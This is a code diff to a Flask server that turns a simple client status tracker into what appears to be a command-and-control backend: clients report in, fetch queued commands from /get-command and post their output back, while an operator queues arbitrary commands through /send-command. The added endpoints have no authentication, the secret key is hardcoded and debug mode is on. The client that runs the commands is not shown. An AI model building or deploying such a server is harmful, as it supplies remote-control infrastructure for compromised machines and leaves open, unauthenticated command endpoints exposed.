@@ -1,92 +1,61 @@
 from flask import Flask, request, jsonify
-from datetime import datetime
 import time
-import os 
-import threading
+import os
 
 app = Flask(__name__)
 
-VIEWER_SECRET_KEY = os.environ.get("h4shp4p1", "h4shp4p1")
+app.secret_key = 'e116a88b20146059e79872e414c2c770982d1c6a28293774026330084f7b60e6'
 
-status_tracker = {}
-tracker_lock = threading.Lock()
+CLIENT_STATUS = {}
+PENDING_COMMANDS = {}
+COMMAND_OUTPUTS = {}
 
-@app.route('/status-check', methods=['POST'])
-def receive_status():
-    if not request.is_json:
-        return jsonify({"message": "Invalid format"}), 400
+@app.route("/status-check", methods=["POST"])
+def status_check():
+    data = request.json
+    user_id = data.get("user_id")
+    if user_id:
+        CLIENT_STATUS[user_id] = {"ip": data.get("ip"), "status": data.get("status"), "timestamp": time.time()}
+        return jsonify({"message": "Status received"}), 200
+    return jsonify({"error": "Missing user_id"}), 400
 
-    data = request.get_json()
-    user_id = data.get('user_id', 'UNKNOWN')
-    status = data.get('status', 'unknown')
-    ip_addr = data.get('ip', 'N/A')
-    server_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+@app.route("/get-command", methods=["GET"])
+def get_command():
+    user_id = request.args.get("user_id")
+    command = PENDING_COMMANDS.pop(user_id, "none")
+    return jsonify({"command": command}), 200
 
-    with tracker_lock:
-        status_tracker[user_id] = {
-            "status": status,
-            "ip": ip_addr,
-            "last_seen": server_time,
-            "client_status": status
-        }
-    
-    print(f"[{server_time}] CLIENT DATA: {user_id} - {status.upper()} from {ip_addr}")
-    return jsonify({"message": "Status received and stored"}), 200
+@app.route("/post-output", methods=["POST"])
+def post_output():
+    data = request.json
+    user_id = data.get("user_id")
+    if user_id:
+        output_entry = {"output": data.get("output"), "timestamp": data.get("timestamp")}
+        COMMAND_OUTPUTS.setdefault(user_id, []).append(output_entry)
+        return jsonify({"message": "Output received"}), 200
+    return jsonify({"error": "Missing user_id"}), 400
 
-@app.route('/live-status', methods=['GET'])
-def get_live_status():
-    auth_key = request.args.get('key')
-    
-    if auth_key != VIEWER_SECRET_KEY:
-        return jsonify({"error": "Authentication Failed. Invalid key parameter."}), 401
+@app.route("/list-clients", methods=["GET"])
+def list_clients():
+    return jsonify(CLIENT_STATUS), 200
 
-    HEARTBEAT_TIMEOUT = 10
-    current_timestamp = time.time()
-    live_report = {}
-    
-    with tracker_lock:
-        for user_id, entry in status_tracker.items():
-            last_seen_dt = datetime.strptime(entry["last_seen"], "%Y-%m-%d %H:%M:%S")
-            last_seen_ts = last_seen_dt.timestamp()
-            
-            if entry["client_status"] == "offline":
-                current_status = "OFFLINE (Exit)"
-            elif (current_timestamp - last_seen_ts) > HEARTBEAT_TIMEOUT:
-                current_status = "TIMED OUT (Offline)"
-            else:
-                current_status = "ONLINE (Active)"
-            
-            live_report[user_id] = {
-                "live_status": current_status,
-                "ip": entry["ip"],
-                "last_signal": entry["last_seen"]
-            }
-        
-    return jsonify(live_report)
+@app.route("/send-command", methods=["POST"])
+def send_command():
+    data = request.json
+    user_id = data.get("user_id")
+    command = data.get("command")
+    if user_id and command:
+        PENDING_COMMANDS[user_id] = command
+        return jsonify({"message": f"Command '{command}' queued for {user_id}"}), 200
+    return jsonify({"error": "Missing user_id or command"}), 400
 
-@app.route('/delete-user', methods=['POST'])
-def delete_user_id():
-    if not request.is_json:
-        return jsonify({"message": "Invalid format"}), 400
+@app.route("/get-output", methods=["GET"])
+def get_output():
+    user_id = request.args.get("user_id")
+    if user_id:
+        outputs = COMMAND_OUTPUTS.pop(user_id, [])
+        return jsonify({"outputs": outputs}), 200
+    return jsonify({"error": "Missing user_id"}), 400
 
-    data = request.get_json()
-    
-    auth_key = data.get('auth_key')
-    user_id_to_delete = data.get('user_id')
-    
-    if auth_key != VIEWER_SECRET_KEY:
-        print(f"AUTHENTICATION FAILURE for DELETE request from {request.remote_addr}")
-        return jsonify({"error": "Authentication Failed. Invalid key parameter."}), 401
-
-    with tracker_lock:
-        if user_id_to_delete in status_tracker:
-            del status_tracker[user_id_to_delete]
-            print(f"USER DELETED: {user_id_to_delete}")
-            return jsonify({"message": f"User ID {user_id_to_delete} removed."}), 200
-        else:
-            return jsonify({"message": f"User ID {user_id_to_delete} not found."}), 404
-
-
-if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+if __name__ == "__main__":
+    app.run(debug=True)
